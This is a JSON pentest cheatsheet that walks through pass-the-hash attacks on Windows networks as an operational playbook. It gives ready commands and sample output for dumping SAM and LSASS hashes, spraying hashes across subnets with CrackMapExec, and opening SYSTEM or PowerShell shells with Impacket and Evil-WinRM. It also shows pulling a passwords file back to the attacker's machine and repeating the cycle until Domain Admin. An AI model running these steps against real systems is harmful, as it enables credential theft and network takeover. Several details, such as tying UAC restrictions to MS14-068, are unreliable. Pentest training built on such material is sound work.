{
  "cheatsheets": [
    {
      "id": "ad-pass-the-hash-attacks",
      "name": "Pass-the-Hash Attack Deep Dive - NTLM Authentication Exploitation",
      "description": "Complete guide to Pass-the-Hash attacks: hash extraction, format validation, authentication testing, tool usage (Impacket/Mimikatz), UAC bypass, troubleshooting",
      "educational_header": {
        "how_to_recognize": [
          "You have NTLM hash(es) but no plaintext password and don't want to waste time cracking",
          "secretsdump or mimikatz output shows 'username:rid:lm:ntlm:::' format",
          "Need to use hash for authentication without converting to plaintext (pass-the-hash vs. password cracking)",
          "Lateral movement required but only hash available (no Kerberos ticket, no password)",
          "Testing hash validity across multiple machines (password reuse identification)"
        ],
        "when_to_look_for": [
          "After dumping SAM hashes from compromised machine (secretsdump, mimikatz, reg save)",
          "When SAM contains local administrator hash that might be reused across workstations (common misconfiguration)",
          "After obtaining NTLM hash from network capture, NTDS.dit dump, or DCSync attack",
          "security assessment: Pass-the-hash is critical - learn to recognize hash format, use correct syntax for each tool, troubleshoot UAC restrictions"
        ]
      },
      "scenarios": [
        {
          "title": "Scenario 1: Understanding Pass-the-Hash (Why Does This Work?)",
          "context": "You dumped SAM hashes from compromised Windows workstation. Output shows 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::'. You wonder: can I use this hash for authentication without cracking it? Why does NTLM allow hash-based authentication? What's the security implication?",
          "approach": "NTLM authentication uses challenge-response protocol that never transmits password or hash directly. Instead: (1) Client requests authentication, (2) Server sends random challenge, (3) Client encrypts challenge with NTLM hash (not password), (4) Server validates encrypted response. The KEY INSIGHT: Client uses NTLM hash as encryption key - it never needs the plaintext password. If you have the hash, you can respond to challenges just like the legitimate user. This is PROTOCOL LIMITATION, not an exploit. Microsoft can't fix it without breaking backward compatibility (would require replacing NTLM entirely with Kerberos - impossible for non-domain scenarios).",
          "commands": [
            "pth-verify-hash-format",
            "secretsdump-hashes"
          ],
          "expected_outcome": "Understand NTLM authentication flow: (1) Workstation requests login to file server, (2) Server sends 16-byte challenge: 0x1122334455667788, (3) Workstation encrypts challenge using NTLM hash as key (DES-based encryption), (4) Workstation sends encrypted response, (5) Server encrypts same challenge with hash stored in SAM, (6) Server compares: if responses match, authentication succeeds. INSIGHT: Step 3 only needs hash (31d6cfe0d16ae931b73c59d7e0c089c0), not password. Tools like Impacket and Mimikatz replicate this flow. When you pass hash to psexec, it uses hash to respond to NTLM challenges. Server doesn't know you're using hash instead of password - the protocol is identical.",
          "why_this_works": "NTLM (NT LAN Manager) is legacy authentication protocol from Windows NT 3.1 (1993). It uses challenge-response to avoid transmitting passwords over network. NTLM hash calculation: (1) Take password 'P@ssw0rd', (2) Convert to Unicode, (3) Apply MD4 hash → 32 hex characters (NTLM hash). During authentication, client uses this hash (not password) to encrypt challenges. PROBLEM: If attacker obtains hash, they can authenticate just like legitimate user. This is called 'pass-the-hash' - passing hash instead of password. Microsoft designed this for password change scenarios (client needs to prove current password without transmitting it), but it enables lateral movement. UAC mitigations added in 2014 (MS14-068) restrict non-RID-500 local admin hashes over network, but domain account hashes still work."
        },
        {
          "title": "Scenario 2: Hash Extraction and Format Validation",
          "context": "You have SYSTEM shell on Windows workstation 192.168.50.100. You need to extract NTLM hashes from local SAM database and verify format before attempting pass-the-hash. Wrong hash format wastes time - better to validate first.",
          "approach": "Method 1 (from Kali): impacket-secretsdump -sam sam.hive -system system.hive LOCAL (requires registry hive dumps from target: reg save HKLM\\SAM sam.hive). Method 2 (from compromised Windows with Mimikatz): privilege::debug; lsadump::sam. Method 3 (remote dump from Kali with admin creds): impacket-secretsdump 'corp/admin:P@ssw0rd@192.168.50.100'. Output format: 'username:rid:lm:ntlm:::'. Extract 4th field (NTLM hash). Validate: must be exactly 32 hexadecimal characters (0-9, a-f). Example: '31d6cfe0d16ae931b73c59d7e0c089c0' = valid. '31d6cfe0d16ae931b73c59d7e0c089c' = invalid (31 chars, missing digit).",
          "commands": [
            "secretsdump-hashes",
            "mimikatz-logonpasswords",
            "pth-verify-hash-format"
          ],
          "expected_outcome": "secretsdump output: 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::'. Parse fields separated by colons: Field 1 = username (Administrator), Field 2 = RID (500 = built-in Administrator), Field 3 = LM hash (aad3b... = empty password LM hash, ignore this), Field 4 = NTLM hash (31d6cfe0... = THIS IS WHAT YOU NEED), Field 5+ = empty. Extract NTLM: '31d6cfe0d16ae931b73c59d7e0c089c0'. Validate length: 32 characters. Validate characters: [0-9a-f] only. THIS HASH represents empty password (''). Real hashes look different, e.g., 'fc525c9683e8fe067095ba2ddc971889' = 'P@ssw0rd123'. Save username:hash mapping for documentation: 'Administrator:31d6cfe0d16ae931b73c59d7e0c089c0'.",
          "why_this_works": "SAM (Security Accounts Manager) database stores local user hashes in registry hive HKLM\\SAM. File location: C:\\Windows\\System32\\config\\SAM. This file is locked while Windows running (can't copy directly). Solution: (1) Dump registry hives with 'reg save HKLM\\SAM sam.hive', (2) Extract with secretsdump offline, OR (3) Read from LSASS process memory with Mimikatz (requires SeDebugPrivilege). SAM structure: Encrypted with SYSKEY (stored in SYSTEM hive). secretsdump uses SYSTEM hive to decrypt SAM and extract hashes. Output format 'username:rid:lm:ntlm:::' is secretsdump convention (compatible with John the Ripper hash cracking format). LM hash field often shows 'aad3b435b51404eeaad3b435b51404ee' = empty LM hash (LM disabled on modern Windows). NTLM hash is what you need for pass-the-hash attacks."
        },
        {
          "title": "Scenario 3: Testing Hash Validity with CrackMapExec",
          "context": "You extracted hash 'fc525c9683e8fe067095ba2ddc971889' for user 'admin' from SAM dump. Before attempting lateral movement with Impacket, you want to quickly test if hash is valid and where it grants access. CrackMapExec provides fast hash validation and network-wide spraying.",
          "approach": "Test single target: crackmapexec smb 192.168.50.100 -u admin -H fc525c9683e8fe067095ba2ddc971889 --local-auth. Look for [+] vs [-] indicator. [+] admin:fc525c9... (Pwn3d!) = hash is valid AND you have local admin access. [+] admin:fc525c9... = hash is valid but you're not admin. [-] admin:fc525c9... STATUS_LOGON_FAILURE = hash is invalid (wrong hash, account doesn't exist, password changed). Spray across subnet: crackmapexec smb 192.168.50.0/24 -u admin -H fc525c9683e8fe067095ba2ddc971889 --local-auth. Identify all machines where this local admin hash is reused (very common - admins use same local admin password across workstations).",
          "commands": [
            "pth-cme-spray",
            "cme-smb-auth-test"
          ],
          "expected_outcome": "Single target test output: 'SMB 192.168.50.100 445 WORKSTATION01 [+] .\\admin:fc525c9683e8fe067095ba2ddc971889 (Pwn3d!)'. Pwn3d! indicator means: (1) Hash is valid for this account, (2) Account has local administrator privileges, (3) You can use this hash for lateral movement (PSExec, WMI, etc.). Subnet spray output: '192.168.50.100 (Pwn3d!), 192.168.50.102 (Pwn3d!), 192.168.50.105 (Pwn3d!), 192.168.50.110 (+), 192.168.50.120 (-)'. Interpretation: 3 machines (.100, .102, .105) have same local admin hash and you have admin access. 1 machine (.110) accepts hash but you're not admin (standard user 'admin' account). 1 machine (.120) rejects hash (account doesn't exist or password different). You now have 3 lateral movement targets. This saves hours vs. manually testing each machine with psexec.",
          "why_this_works": "CrackMapExec automates NTLM authentication testing using pass-the-hash. Under the hood: (1) Connects to SMB port 445, (2) Performs NTLM authentication using provided hash (same protocol as legitimate auth, no password needed), (3) Attempts to access ADMIN$ share (requires local admin), (4) Reports result: Pwn3d! = auth succeeded + admin access, (+) = auth succeeded + standard user, (-) = auth failed. The --local-auth flag forces local account authentication (.\\admin) instead of domain (corp\\admin). This is critical for testing local admin hash reuse. Hash spraying (testing one hash against multiple targets) exploits common misconfiguration: admins set same local admin password on all workstations via GPO or manual configuration. If you compromise one machine's local admin hash, you often compromise 50+ machines instantly."
        },
        {
          "title": "Scenario 4: Lateral Movement with Impacket Pass-the-Hash",
          "context": "CrackMapExec confirmed hash 'fc525c9683e8fe067095ba2ddc971889' grants local admin access on 192.168.50.100. Now you need interactive shell to dump credentials, search files, or install persistence. Impacket suite provides three pass-the-hash tools: psexec (SYSTEM shell, binary upload), wmiexec (fileless, semi-interactive), smbexec (fileless, similar to wmiexec). Choose based on scenario.",
          "approach": "PSExec (default choice - SYSTEM shell, most reliable): impacket-psexec -hashes :fc525c9683e8fe067095ba2ddc971889 administrator@192.168.50.100. Syntax: -hashes LM:NTLM (use empty LM hash → :NTLM). WMIExec (if PSExec detected/blocked): impacket-wmiexec -hashes :fc525c9683e8fe067095ba2ddc971889 administrator@192.168.50.100. Provides semi-interactive shell via WMI, no binary upload (stealthier). SMBExec (alternative to WMI): impacket-smbexec -hashes :fc525c9683e8fe067095ba2ddc971889 administrator@192.168.50.100. Uses SMB + task scheduler, no service creation. All three tools accept -hashes flag for pass-the-hash.",
          "commands": [
            "pth-impacket-psexec",
            "pth-impacket-wmiexec",
            "pth-impacket-smbexec"
          ],
          "expected_outcome": "PSExec output: '[*] Requesting shares on 192.168.50.100..... [*] Found writable share ADMIN$ [*] Uploading file kLqNDASz.exe [*] Opening SVCManager on 192.168.50.100..... [*] Creating service pZmQ on 192.168.50.100..... [*] Starting service pZmQ..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.19045.2006] (c) Microsoft Corporation. All rights reserved. C:\\Windows\\system32>'. Run 'whoami' → 'nt authority\\system'. You have SYSTEM shell without password - only hash used for authentication. WMIExec output: '[*] SMBv3.0 dialect used [!] Launching semi-interactive shell - Careful what you execute [!] Press help for extra shell commands C:\\>'. Semi-interactive means: each command executes separately (no persistent cmd.exe process), output returns to Kali terminal. Less interactive than PSExec but fileless (no uploaded binary).",
          "why_this_works": "Impacket implements pass-the-hash by handling NTLM authentication natively in Python. When you provide -hashes :fc525c9..., Impacket: (1) Connects to target SMB/RPC service, (2) Receives NTLM challenge from server, (3) Encrypts challenge using provided hash (without ever needing password), (4) Sends response, (5) Server validates response against stored hash, (6) Authentication succeeds. PSExec then uploads binary and creates service (requires admin). WMIExec uses WMI Win32_Process.Create() method (requires admin, no upload). SMBExec uses scheduled tasks via SMB (requires admin, no service creation). All three work identically to password-based authentication from server's perspective - NTLM protocol doesn't distinguish between 'user knows password' vs 'attacker has hash'."
        },
        {
          "title": "Scenario 5: UAC Restrictions and RID-500 Bypass",
          "context": "You dumped local admin hash from Workstation01: 'admin:1001:...:fc525c9...'. Hash spray with CrackMapExec shows this hash works on 20+ other workstations (password reuse). But when you try 'impacket-psexec -hashes :fc525c9... admin@192.168.50.102', you get 'STATUS_ACCESS_DENIED' even though CrackMapExec showed (Pwn3d!). This is UAC Remote Restrictions (MS14-068 patch).",
          "approach": "Problem: Microsoft patch KB2871997 (2014) blocks network authentication for all local admin accounts EXCEPT built-in Administrator (RID 500). RID 1001 means user-created admin account - network auth blocked. Solution 1: Use built-in Administrator account hash (RID 500) instead. Extract: secretsdump shows 'Administrator:500:...:31d6cfe0...'. Use THIS hash for pass-the-hash. Solution 2: Use domain account hash (UAC restriction only affects local accounts). Solution 3: Disable UAC restriction via registry (requires existing admin access - chicken-and-egg problem). pentest TIP: Always prioritize RID-500 Administrator hash over other local admin hashes for lateral movement.",
          "commands": [
            "pth-verify-hash-format",
            "secretsdump-hashes",
            "pth-impacket-psexec"
          ],
          "expected_outcome": "secretsdump output shows two local admin accounts: 'Administrator:500:...:8846f7eaee8fb117ad06bdd830b7586c:::' (RID 500 = built-in), 'admin:1001:...:8846f7eaee8fb117ad06bdd830b7586c:::' (RID 1001 = user-created). Notice SAME NTLM hash (8846f7...) for both - same password. Test RID-1001 hash: 'impacket-psexec -hashes :8846f7... admin@192.168.50.102' → STATUS_ACCESS_DENIED (UAC blocked). Test RID-500 hash: 'impacket-psexec -hashes :8846f7... Administrator@192.168.50.102' → SUCCESS! C:\\Windows\\system32> prompt. INSIGHT: Use Administrator account name (RID 500) even though hash is identical. UAC filter checks RID, not hash. Alternative: If you have domain account hash (corp\\dadmin:fc525c...), use that - UAC restriction doesn't apply to domain accounts: 'impacket-psexec -hashes :fc525c... corp/dadmin@192.168.50.102'.",
          "why_this_works": "UAC (User Account Control) Remote Restrictions introduced in Windows Vista, strengthened in 2014 patch KB2871997. PURPOSE: Prevent lateral movement using local admin accounts (except RID-500). MECHANISM: When non-RID-500 local admin authenticates over network, Windows filters their token to remove admin rights - they get standard user privileges even though they're in Administrators group. This breaks PSExec, WMI, and other admin-required techniques. EXCEPTION: Built-in Administrator account (RID 500) is exempt from filtering - it always gets full admin token over network. pentest IMPLICATION: When dumping SAM hashes, always check RID field. RID 500 = gold for lateral movement. RID 1000+ = might work on some machines (depending on patch level) but unreliable. Domain account hashes are NOT affected by UAC restrictions - they get full admin token if they're in local Administrators group."
        },
        {
          "title": "Scenario 6: Evil-WinRM Pass-the-Hash for Interactive Shell",
          "context": "You have NTLM hash and need best interactive shell from Kali (better than Impacket's semi-interactive WMIExec, more features than PSExec). Target has WinRM enabled (port 5985 open). Evil-WinRM supports pass-the-hash and provides rich PowerShell remoting with file upload/download.",
          "approach": "Syntax: evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>. Example: evil-winrm -i 192.168.50.100 -u administrator -H fc525c9683e8fe067095ba2ddc971889. Do NOT include colon prefix for hash (common mistake: -H :fc525c... → wrong, -H fc525c... → correct). Do NOT include LM hash (Evil-WinRM only needs NTLM). Once connected, you get fully interactive PowerShell prompt with: tab completion, command history (up arrow), multi-line commands, built-in upload/download commands.",
          "commands": [
            "evil-winrm-hash",
            "pth-evil-winrm"
          ],
          "expected_outcome": "Evil-WinRM connection output: 'Evil-WinRM shell v3.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\administrator\\Documents>'. You have interactive PowerShell. Test commands: 'whoami' → 'corp\\administrator', 'hostname' → 'WORKSTATION01', 'Get-Process' → list of running processes. Upload enumeration script: 'upload /opt/PowerUp.ps1 C:\\Temp\\PowerUp.ps1' → [+] Upload successful. Run script: 'Import-Module C:\\Temp\\PowerUp.ps1; Invoke-AllChecks' → PowerUp enumeration output. Download loot: 'download C:\\Users\\admin\\Desktop\\passwords.txt /home/kali/loot/passwords.txt' → [+] Download successful. Evil-WinRM provides best user experience for pass-the-hash lateral movement - prefer this over Impacket when WinRM available.",
          "why_this_works": "Evil-WinRM is Ruby-based tool that implements PowerShell Remoting protocol with pass-the-hash support. WinRM (Windows Remote Management) uses HTTP/HTTPS (ports 5985/5986) for transport and supports NTLM authentication. When you provide -H flag, Evil-WinRM: (1) Initiates WinRM connection over HTTP, (2) Receives NTLM challenge, (3) Uses provided hash to compute challenge response, (4) Authenticates without password. WinRM then spawns PowerShell runspace in user's context (not SYSTEM like PSExec). Advantages over Impacket: (1) Fully interactive (real PowerShell session, not semi-interactive), (2) Tab completion works, (3) Multi-line commands supported, (4) Built-in upload/download (Impacket requires separate SMB session), (5) Menu system for common tasks. Disadvantages: (1) Requires WinRM enabled (not always available), (2) Runs as user (not SYSTEM), (3) Creates WinRM event logs (Event ID 6 in Microsoft-Windows-WinRM/Operational)."
        }
      ],
      "sections": [
        {
          "title": "Phase 1: Hash Extraction",
          "notes": "Extract NTLM hashes from compromised systems using: (1) secretsdump (from Kali) - requires SAM/SYSTEM registry hives or admin credentials for remote dump, (2) Mimikatz (from Windows) - requires SYSTEM or SeDebugPrivilege for LSASS memory access, (3) Manual registry dump - 'reg save HKLM\\SAM sam.hive' then parse offline. Output format: 'username:rid:lm:ntlm:::'. Always verify RID field - RID 500 (Administrator) bypasses UAC restrictions. Document username-to-hash mapping for tracking.",
          "commands": [
            {
              "id": "secretsdump-hashes",
              "example": "impacket-secretsdump 'corp.com/administrator:Password123!@192.168.50.70'",
              "shows": "Output: 'Impacket v0.10.0 - Copyright 2022 SecureAuth Cor..."
            },
            {
              "id": "mimikatz-logonpasswords",
              "shows": "See command documentation"
            },
            {
              "id": "pth-verify-hash-format",
              "example": "crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
              "shows": "[+] <DOMAIN>\\<USER>:<NTLM_HASH> (Pwn3d!)"
            }
          ]
        },
        {
          "title": "Phase 2: Hash Validation and Spraying",
          "notes": "Before attempting exploitation, validate hash and identify where it grants access. Use CrackMapExec for fast testing: (1) Single target - 'crackmapexec smb <TARGET> -u <USER> -H <HASH> --local-auth', look for Pwn3d! indicator. (2) Subnet spray - 'crackmapexec smb 192.168.50.0/24 -u admin -H <HASH> --local-auth', identify all vulnerable machines. (3) Domain spray - 'crackmapexec smb <DC> -u <USER> -H <HASH> -d <DOMAIN>', test domain account hash. Hash spraying exploits password reuse - same local admin password across workstations is common misconfiguration.",
          "commands": [
            {
              "id": "pth-cme-spray",
              "example": "crackmapexec smb 192.168.50.0/24 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
              "shows": "[+] <TARGET> (Pwn3d!)"
            },
            {
              "id": "cme-smb-auth-test",
              "shows": "See command documentation"
            },
            {
              "id": "pth-verify-hash-format",
              "example": "crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
              "shows": "[+] <DOMAIN>\\<USER>:<NTLM_HASH> (Pwn3d!)"
            }
          ]
        },
        {
          "title": "Phase 3: Lateral Movement Tool Selection",
          "notes": "Choose pass-the-hash tool based on requirements: (1) Evil-WinRM - Best interactive shell, requires WinRM enabled (port 5985/5986 open). Use when you need PowerShell interactivity and file transfer. (2) Impacket PSExec - SYSTEM shell, most reliable, writes binary to disk. Use when you need highest privileges. (3) Impacket WMIExec - Fileless, semi-interactive, stealthier than PSExec. Use when AV is concern. (4) Impacket SMBExec - Fileless via task scheduler, alternative to WMI. All accept -hashes :NTLM or -H NTLM syntax.",
          "commands": [
            {
              "id": "pth-impacket-psexec",
              "example": "impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73",
              "shows": "[*] Requesting shares on <TARGET>"
            },
            {
              "id": "pth-impacket-wmiexec",
              "example": "impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73",
              "shows": "[*] SMBv3.0 dialect used"
            },
            {
              "id": "pth-impacket-smbexec",
              "example": "impacket-smbexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73",
              "shows": "[!] Launching semi-interactive shell"
            },
            {
              "id": "evil-winrm-hash",
              "example": "evil-winrm -i 192.168.50.73 -u administrator -H 64f12cddaa88057e06a81b54e73b949b",
              "shows": "Evil-WinRM shell v3"
            }
          ]
        },
        {
          "title": "Phase 4: UAC Restriction Bypass",
          "notes": "Microsoft KB2871997 (2014) blocks network authentication for local admin accounts except RID-500 Administrator. SYMPTOM: CrackMapExec shows Pwn3d! but psexec gives STATUS_ACCESS_DENIED. SOLUTION: (1) Use built-in Administrator account (RID 500) hash instead of user-created admin account, (2) Use domain account hash (UAC restriction only affects local accounts), (3) Check patch level - unpatched systems don't have restriction. Always prioritize RID-500 hash extraction from SAM dumps.",
          "commands": [
            {
              "id": "secretsdump-hashes",
              "example": "impacket-secretsdump 'corp.com/administrator:Password123!@192.168.50.70'",
              "shows": "Output: 'Impacket v0.10.0 - Copyright 2022 SecureAuth Cor..."
            },
            {
              "id": "pth-impacket-psexec",
              "example": "impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73",
              "shows": "[*] Requesting shares on <TARGET>"
            },
            {
              "id": "pth-verify-hash-format",
              "example": "crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
              "shows": "[+] <DOMAIN>\\<USER>:<NTLM_HASH> (Pwn3d!)"
            }
          ]
        },
        {
          "title": "Phase 5: Post-Compromise Credential Harvesting",
          "notes": "After successful pass-the-hash lateral movement, immediately dump credentials from new machine for further access: (1) SAM hashes - 'reg save HKLM\\SAM' then secretsdump, (2) LSASS memory - Mimikatz sekurlsa::logonpasswords (requires SYSTEM shell from PSExec), (3) Domain cached credentials - secretsdump -security option. Test newly obtained hashes with CrackMapExec spray - identify additional targets. Rinse and repeat until Domain Admin obtained or all targets compromised.",
          "commands": [
            {
              "id": "secretsdump-hashes",
              "example": "impacket-secretsdump 'corp.com/administrator:Password123!@192.168.50.70'",
              "shows": "Output: 'Impacket v0.10.0 - Copyright 2022 SecureAuth Cor..."
            },
            {
              "id": "mimikatz-logonpasswords",
              "shows": "See command documentation"
            },
            {
              "id": "pth-cme-spray",
              "example": "crackmapexec smb 192.168.50.0/24 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
              "shows": "[+] <TARGET> (Pwn3d!)"
            }
          ]
        },
        {
          "title": "Phase 6: Troubleshooting Pass-the-Hash Failures",
          "notes": "Common failures: (1) STATUS_LOGON_FAILURE - Hash is wrong (verify format: 32 hex chars), account disabled, or hash changed. Retest with CrackMapExec. (2) STATUS_ACCESS_DENIED - Hash works but UAC blocking (use RID-500 or domain account). (3) Connection timeout - Firewall blocking (verify ports with nmap). (4) Hash format error - Impacket uses -hashes :NTLM (colon prefix for empty LM), Evil-WinRM uses -H NTLM (no colon). (5) WinRM hash fails but SMB works - User not in Remote Management Users group (try PSExec instead).",
          "commands": [
            {
              "id": "pth-verify-hash-format",
              "example": "crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
              "shows": "[+] <DOMAIN>\\<USER>:<NTLM_HASH> (Pwn3d!)"
            },
            {
              "id": "cme-smb-auth-test",
              "shows": "See command documentation"
            },
            {
              "id": "lateral-movement-troubleshooting",
              "example": "# Test credentials: crackmapexec smb 192.168.45.100 -u admin -p password\n# Test admin access: crackmapexec smb 192.168.45.100 -u admin -p password --shares\n# Test hash: crackmapexec smb 192.168.45.100 -u admin -H abc123...\n# Check UAC restriction: If local admin hash fails but domain user works, UAC blocking PTH\n# Verify ports: sudo nmap -p 135,445,5985 -Pn -v 192.168.45.100\n# Check firewall: Test-NetConnection 192.168.45.100 -Port 80 from Windows\n# Time sync: net time \\\\192.168.45.100 (Kerberos requires <5 min time skew)\n# Service status: Get-Service WinRM,RpcSs -ComputerName 192.168.45.100",
              "shows": "[+] Pwn3d! from CrackMapExec (admin access confirmed)"
            }
          ]
        }
      ],
      "tags": [
        "ACTIVE_DIRECTORY",
        "PASS_THE_HASH",
        "NTLM",
        "LATERAL_MOVEMENT",
        "IMPACKET",
        "EVIL-WINRM",
        "UAC"
      ]
    }
  ]
}